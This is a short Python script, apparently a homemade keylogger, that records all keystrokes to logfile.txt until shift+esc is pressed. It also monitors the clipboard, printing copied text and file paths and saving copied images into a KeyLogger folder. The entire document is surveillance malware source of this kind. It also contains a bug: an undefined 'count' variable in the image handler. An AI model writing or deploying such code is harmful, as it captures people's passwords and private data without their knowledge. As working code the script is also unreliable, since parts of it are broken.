import keyboard
import clipboard_monitor
import threading
import sys
from PIL import Image, ImageGrab

class stoppableThread(threading.Thread):
    def __init__(self, *args, **kwargs):
        super(stoppableThread,self).__init__(*args, **kwargs)
        self._stopEvent = threading.Event()
    
    def stop(self):
        self._stopEvent.set()

def clip_txt(text):
    print("Text copied!")
    print(text)

def clip_file(file):
    print("File copied!")
    print(file)

def clip_img():
    print("Image copied!")
    img = ImageGrab.grabclipboard()
    img.save(f"./KeyLogger/{count}.png")
    count += 1

def keylog():
    record = keyboard.record(until="shift+esc")
    with open("logfile.txt", "w") as f:
        for item in record:
            if item.event_type == "down":
                f.write(item.name)
    print("Recorded data")

def clipboardlog():
    clipboard_monitor.on_text(clip_txt)
    clipboard_monitor.on_files(clip_file)
    clipboard_monitor.on_image(clip_img)
    clipboard_monitor.wait()
    

def main():
    count = 0
    key_thread = threading.Thread(target=keylog)
    clip_thread = stoppableThread(target=clipboardlog)
    clip_thread.daemon = True 
    key_thread.start()
    clip_thread.start()

    print("HI!")

    key_thread.join()
    print("JOIN 1")
    sys.exit()
    
if __name__=="__main__":
    main()
